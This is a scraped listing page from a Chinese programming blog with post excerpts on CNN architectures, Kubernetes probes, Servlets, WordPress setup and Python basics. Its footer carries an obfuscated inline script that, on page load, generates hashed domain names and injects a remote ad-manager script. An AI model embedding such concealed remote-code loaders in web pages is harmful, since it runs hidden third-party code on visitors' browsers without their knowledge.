Inception网络
按照上面的说法，我们的这层的模型参数与输入的特征维数（28x28x192）,卷积核大小以及卷积通道数(包括三种卷积核，分别是1x1x64,3x3x128,5x5x32)，所以参数为：
参数：(1×1×192×64) + (3×3×192×128) + (5×5×192×32) = 153600
最终输出的feature map个数：64+128+32+192 = 416
池化层不引人参数！
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f526edb2bc2d58d28294505a6337c731/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/536b0857069414b4f1c14e22ef6a4bda/" rel="bookmark">
			解决OSError: [Errno 98] Address already in use问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		学习python socket编程，运行服务器端时报错OSError: [Errno 98] Address already in use
1、使用命令sudo netstat -tunlp 查看绑定正在使用的端口号，可以看到12345端口号被963进程占用，这里需要加上sudo或者切换到管理员用户运行，否则不显示PID。
2、使用sudo kill -9 963杀掉该进程即可，其中963为进程的端口号，再次运行socket服务运行正常。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ae4299cc86b4e820fefe4eac4dafe514/" rel="bookmark">
			解决python opencv中imshow显示黑色图像问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 在ubuntu18.04下使用python中cv2.imshow显示图像时，显示的是黑色图像，不能正常显示，如下图所示
具体原因为显示窗口时没有添加cv2.destroyAllWindows() 添加摧毁所有窗口后，重新运行代码显示正常。
img = cv2.imread(IMG_PATH) cv2.namedWindow('test1', cv2.WINDOW_NORMAL) cv2.imshow('test1', img) cv2.waitKey(0) cv2.destroyAllWindows() 若以上方法不能解决，则可能使显示图像过大，窗口不能完全显示，可尝试cv2.resizeWindow(“WindowsName”, 500 , 400)指定窗口大小。
img = cv2.imread(IMG_PATH) cv2.namedWindow('test1', cv2.WINDOW_NORMAL) cv2.resizeWindow(“test1”, 500, 400) cv2.imshow('test1', img) cv2.waitKey(0) cv2.destroyAllWindows() 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/880d58825838429cfc89c1674b517f4f/" rel="bookmark">
			K8S 三种探针 readinessProbe、livenessProbe和startupProbe
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、POD状态 Pod 常见的状态 Pending：挂起，我们在请求创建pod时，条件不满足，调度没有完成，没有任何一个节点能满足调度条件。已经创建了但是没有适合它运行的节点叫做挂起，这其中也包含集群为容器创建网络，或者下载镜像的过程。 Running：Pod内所有的容器都已经被创建，且至少一个容器正在处于运行状态、正在启动状态或者重启状态。 Succeeded：Pod中所以容器都执行成功后退出，并且没有处于重启的容器。
Failed：Pod中所以容器都已退出，但是至少还有一个容器退出时为失败状态。
Unknown：未知状态，所谓pod是什么状态是apiserver和运行在pod节点的kubelet进行通信获取状态信息的，如果节点之上的kubelet本身出故障，那么apiserver就连不上kubelet，得不到信息了，就会看Unknown
Pod重启策略 Always: 只要容器失效退出就重新启动容器。
OnFailure: 当容器以非正常(异常)退出后才自动重新启动容器。
Never: 无论容器状态如何，都不重新启动容器。
如果pod的restartpolicy没有设置，那么默认值是Always。 Pod常见状态转换场景 二、就绪、存活两种探针 K8S 提供了3种探针
readinessProbelivenessProbestartupProbe（这个1.16版本增加的） 探针介绍 在 Kubernetes 中 Pod 是最小的计算单元，而一个 Pod 又由多个容器组成，相当于每个容器就是一个应用，应用在运行期间，可能因为某也意外情况致使程序挂掉。那么如何监控这些容器状态稳定性，保证服务在运行期间不会发生问题，发生问题后进行重启等机制，就成为了重中之重的事情，考虑到这点 kubernetes 推出了活性探针机制。有了存活性探针能保证程序在运行中如果挂掉能够自动重启，但是还有个经常遇到的问题，比如说，在Kubernetes 中启动Pod，显示明明Pod已经启动成功，且能访问里面的端口，但是却返回错误信息。还有就是在执行滚动更新时候，总会出现一段时间，Pod对外提供网络访问，但是访问却发生404，这两个原因，都是因为Pod已经成功启动，但是 Pod 的的容器中应用程序还在启动中导致，考虑到这点Kubernetes推出了就绪性探针机制。
1、livenessProbe livenessProbe：存活性探针，用于判断容器是不是健康，如果不满足健康条件，那么 Kubelet 将根据 Pod 中设置的 restartPolicy （重启策略）来判断，Pod 是否要进行重启操作。LivenessProbe按照配置去探测 ( 进程、或者端口、或者命令执行后是否成功等等)，来判断容器是不是正常。如果探测不到，代表容器不健康（可以配置连续多少次失败才记为不健康），则 kubelet 会杀掉该容器，并根据容器的重启策略做相应的处理。如果未配置存活探针，则默认容器启动为通过（Success）状态。即探针返回的值永远是 Success。即Success后pod状态是RUNING
2、readinessProbe readinessProbe 就绪性探针，用于判断容器内的程序是否存活（或者说是否健康），只有程序(服务)正常， 容器开始对外提供网络访问（启动完成并就绪）。容器启动后按照readinessProbe配置进行探测，无问题后结果为成功即状态为 Success。pod的READY状态为 true，从0/1变为1/1。如果失败继续为0/1，状态为 false。若未配置就绪探针，则默认状态容器启动后为Success。对于此pod、此pod关联的Service资源、EndPoint 的关系也将基于 Pod 的 Ready 状态进行设置，如果 Pod 运行过程中 Ready 状态变为 false，则系统自动从 Service资源 关联的 EndPoint 列表中去除此pod，届时service资源接收到GET请求后，kube-proxy将一定不会把流量引入此pod中，通过这种机制就能防止将流量转发到不可用的 Pod 上。如果 Pod 恢复为 Ready 状态。将再会被加回 Endpoint 列表。kube-proxy也将有概率通过负载机制会引入流量到此pod中。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/880d58825838429cfc89c1674b517f4f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a11cdd30cfb2006e55c870896c75728c/" rel="bookmark">
			Servlet要点、请求与响应
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一: Servlet要点
01.Servlet规范和搭建JavaWeb项目
什么是Service: Service是JavaEE的组件,service是一个程序类,要求必须实现javax.service.Service接口. 也是JavaEE中的规范.服务器其实是Service的实现, 搭建标准的JavaWeb的项目结构: 1.创建一个java项目:HelloServletWeb: 2.在HelloServletWeb中创建一个文件夹webapp,表示web项目的根; 3.在webAPP中创建WEB-INF文件夹, 4.在WEB-INF中创建文件夹:lib,classes 5.在WEB-INF中去Tomcat根/conf拷贝web.xml文件,只需要保留根元素. 6.把当前项目的classpath路径改成webapp/WEB-INF下的classes中. 02.第一个Servlet的程序
Service的第一个程序编写步骤: 1):拷贝Tomcat根/lib/servlet-api.jar到项目的WEB-INF/lib目录中,并做build path. 2):编写Servlet程序,使之实现javax.servlet.Servlet接口,并覆盖接口中的方法. public class HelloServlet implement javax.servlet.Servilet(...实现方法...) 3):发现方法中的参数出现arg0,arg1的情况是因为没有关联Servlet的源代码. 是否关联源代码和程序最终的运行没有关系,只是在开发阶段参数美观,可阅读源代码. 4):在service(ServletRequest req, ServletResponse res)方法,打印一句话. 引导:此时HelloServlet类,和Tomcat一点关系都没有:我们需要告诉Tomcat来帮我们管理HelloServlet类, (Tomcat是Servlet的容器,会负责Servlet对象的声明)所以,得以配置的形式,告诉Tomcat来帮我们管理自定义的Servlet类. 5):Servlet配置:在web.xml文件中的配置,切记&lt;url-pattern&gt;/hello&lt;/url-pattern&gt;中的hello要加"/" 6):部署项目并访问:server.xml中:&lt;Context docBase="D:\Java EE\Servlet\webapp" path="day3"&gt; 访问:http://ip:port/contextPath/资源名 http://localhost:80/day3/hello 03.Servlet的生命周期方法
Servlet的生命周期:创建对象,初始化操作,运行操作,销毁操作. javax.servlet.Servlet接口中的方法: String getServletInfo():获取Servlet的信息(Servlet的作者,版本,版权相关). ServletConfig getServletConfig();获取Servlet的配置信息对象. 生命周期方法:在WEB的生命周期中(Tomcat启动--&gt;Tomcat关闭),Servlet是单例的. 构造器:在服务端程序第一次被请求的时候,调用,只被调用一次. void init(ServletConfig config);在构造器执行完毕之后,调用init方法,也只会执行一次. void service(ServletRequest req, ServletResponse resp):每一次请求都会执行该方法. void destroy();正常关闭Tomcat才会执行(该方法不一定会被执行,我们没有必要在其中编写扫尾的操作). 总结: 构造器---&gt;init方法---&gt; {servlet方法}循环 ----&gt;destory方法 注意: 1):Servlet类的构造器必须使用public修饰. 2):Servlet类必须是无参数构造器. 原因:底层创建Servlet对象:class.newInstance()方式.---&gt;公共的无参数构造器. 总结:保证Servlet必须有一个公共的无参数构造器,方便Tomcat底层创建Servlet的对象. 04.Servlet的请求流程-图片版
05.Servlet的请求流程-文字版
1:浏览器先发送请求:http://localhost:80/day3/hello 2:DNS解析域名(忽略) 3:Tomcat解析请求:/day3/hello.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a11cdd30cfb2006e55c870896c75728c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/91e686ceb952b33bc461fdecebaf6165/" rel="bookmark">
			使用WordPress搭建一个专属自己的博客
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		阿里云官方实验体验链接
如下是我们进入实验的界面从此处开始操作
首先,我们先进行ECS服务器的连接
安装WordPress中文版 1. 安装WordPress。 执行以下命令，获取wordpress中文安装包
wget https://cn.wordpress.org/latest-zh_CN.tar.gz **注意:**在这里我们生成一个压缩文件,需要我们自己去加压安装
执行以下命令，解压
tar -zxvf latest-zh_CN.tar.gz 执行以下命令，移动wordpress到Apache根目录
mkdir /var/www/html/wp-blog mv wordpress/* /var/www/html/wp-blog/ 2. 初始化wordpress 执行以下命令，查看wp-config-sample.php文件
cat -n /var/www/html/wp-blog/wp-config-sample.php 在进行一些cd转换后,我们启动Apache服务器然后通过ECS的IP访问我们的wordpress页面
systemctl start httpd http://&lt;ECS公网IP&gt;/wp-blog/wp-admin/install.php **注意:**此处的ECS公网IP需要换成自己的IP地址.进入wordpress的初始化页面
3. 自定义站点标题 WordPress可以通过一般可以通过2种安装方法来安装,在这里我们选用第二种方法直接上传主题到wordpress服务器
主题页面如下:
在这里我们选择自己喜欢的主题即可.
在往后就是一些简单的配置了此处就不做讲解了.
4. 总结 阿里云官方会经常性的让我们体验一些不同的新产品以及不同的实验,者对于开发者而言是十分友好的.欢迎大家互相学习.
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/92279dfa5a8ed4d7ce1532f0251651e9/" rel="bookmark">
			“人生苦短，我用Python“——python基础＜1＞
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		python编程入门总结1 输入输出函数print输出input输入 转义字符与注释转义字符注释 变量命名规则变量的结构类型整型浮点型布尔类型字符串类型 类型转换 运算符算数运算符赋值运算符比较运算符布尔运算符位运算符运算符的优先级 程序的结构对象的布尔值选择结构内置函数range()循环结构流程控制语句else语句循环嵌套二层循环中break和continue 输入输出函数 print输出 print(520) print('helloword') print(23*25) 输出到文件当中。注意：1、所指定的盘符存在，2、使用file=fp
fp=open('D:/text.txt','a+')#如果文件不存在就创建，如果存在就追加 print('hello',file=fp) fp.close() 不换行输出
print('hello','world','python')# hello world python input输入 input函数接收输入数据默认为字符串类型str。
present=input('请输入：')#括号内字符串为输入前的提示信息。 print(present,type(present))#这里的present变量类型是str。input函数输入的默认格式就是str。 input使用：加法计算两个的输入数字
a=input('输入一个加数') b=input('输入另一个加数') print(int(a)+int(b))#由于input接受类型为str，所以这里需要进行类型转换。否则就是字符串的拼接。 转义字符与注释 转义字符 转义字符含义\n换行\t制表位\bbackspace退一格/删除\rreturn回车 当输出内容出现敏感字符(例如 ’ )，为了避免发生歧义程序报错。可以使用转义字符“ \ ”。
print('\'nihao\'')# 'nihao' 注释 名称解释单行注释“ # ”多行注释“”" “”" python中并没有多行注释，字符串不赋值给任何变量无意义，所以被作为注释了声明注释#coding:utf-8 python3就不需要了 变量 命名规则 变量、函数、类、模块和对象的名字就叫标识符。
标识符都要遵循以下规则：
字母、数字、下划线不能以数字开头不能是保留字严格区分大小写 其中，python保留字可用以下代码查看
import keyword print(keyword.kwlist) #['False', 'None', 'True', 'and', 'as', 'assert', 'break', 'class', 'continue', 'def', 'del', 'elif', 'else', 'except', 'finally', 'for', 'from', 'global', 'if', 'import', 'in', 'is', 'lambda', 'nonlocal', 'not', 'or', 'pass', 'raise', 'return', 'try', 'while', 'with', 'yield'] 变量的结构 变量由三部分组成：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/92279dfa5a8ed4d7ce1532f0251651e9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e9ace94dec735965c81a400c1a5352d2/" rel="bookmark">
			PyTorch 打印网络模型结构
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		🤵 Author ：Horizon Max
✨ 编程技巧篇：各种操作小结
🎇 机器视觉篇：会变魔术 OpenCV
💥 深度学习篇：简单入门 PyTorch
🏆 神经网络篇：经典网络模型
💻 算法篇：再忙也别忘了 LeetCode
文章目录 PyTorch 打印网络模型结构使用 Print() 函数打印网络Tensorflow / Keras 打印网络PyTorch summary打印网络结构的方法 PyTorch 打印网络模型结构 使用 Print() 函数打印网络 我们在使用PyTorch打印模型结构时都是这样操作的：
model = simpleNet() print(model) 打印结果：
simpleNet( (layer1): Sequential( (0): Conv2d(3, 16, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1)) (1): BatchNorm2d(16, eps=1e-05, momentum=0.1, affine=True, track_running_stats=True) (2): MaxPool2d(kernel_size=2, stride=2, padding=0, dilation=1, ceil_mode=False) (3): ReLU() ) (layer2): Sequential( (0): Conv2d(16, 32, kernel_size=(3, 3), stride=(1, 1), padding=(1, 1)) (1): BatchNorm2d(32, eps=1e-05, momentum=0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e9ace94dec735965c81a400c1a5352d2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f8a372da110e3bfe5d7323906b29235a/" rel="bookmark">
			[ 轻量级网络 ] 经典网络模型4——Xception 详解与复现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		🤵 Author ：Horizon Max
✨ 编程技巧篇：各种操作小结
🎇 机器视觉篇：会变魔术 OpenCV
💥 深度学习篇：简单入门 PyTorch
🏆 神经网络篇：经典网络模型
💻 算法篇：再忙也别忘了 LeetCode
[ 轻量级网络 ] 经典网络模型4——Xception 详解与复现 🚀 Xception🚀 Xception 详解🎨 Xception 网络结构🚩 结构探索🚩 Xception 结构框图🚩 Xception 实验测试 🚀 Xception 复现 🚀 Xception Xception 是一种受启发于 Inception 的新颖深度卷积神经网络架构 ；
将 Inception 模块替换为 深度可分离卷积( depthwise separable convolution ) ；
Xception 与 Inception V3 具有相同数量的参数，但由于模型参数的更有效使用，使得性能进一步的提高 ；
🔗 论文地址：Xception: Deep Learning with Depthwise Separable Convolutions
🚀 Xception 详解 🎨 Xception 网络结构 🚩 结构探索 （1）初始的 Inception 模块：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f8a372da110e3bfe5d7323906b29235a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c0f77eca885a9225db3c0aa97571a5f4/" rel="bookmark">
			[ 注意力机制 ] 经典网络模型3——ECANet 详解与复现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		🤵 Author ：Horizon Max
✨ 编程技巧篇：各种操作小结
🎇 机器视觉篇：会变魔术 OpenCV
💥 深度学习篇：简单入门 PyTorch
🏆 神经网络篇：经典网络模型
💻 算法篇：再忙也别忘了 LeetCode
[ 注意力机制 ] 经典网络模型3——ECA-Net 详解与复现 🚀 Efficient Channel Attention Module🚀 ECA-Net 详解🎨 背景知识🎨 论文贡献🎨 ECA Module🚩 ECA-Net 推理过程🚩 ECA-Net 应用对比 🚀 ECA-Net 复现 🚀 Efficient Channel Attention Module Efficient Channel Attention Module 简称 ECA，2020年 Qilong Wang等人提出的一种 高效通道注意力(ECA)模块 ；
提出了一种 不降维的局部跨通道交互策略 ，有效避免了降维对于通道注意力学习效果的影响 ；
该模块只涉及少数几个 参数，但具有明显的 效果增益 ；
适当的 跨通道交互 可以在保持 性能 的同时 显著降低模型的复杂性 ；
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c0f77eca885a9225db3c0aa97571a5f4/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/237/">«</a>
	<span class="pagination__item pagination__item--current">238/578</span>
	<a class="pagination__item pagination__item--next btn" href="/page/239/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>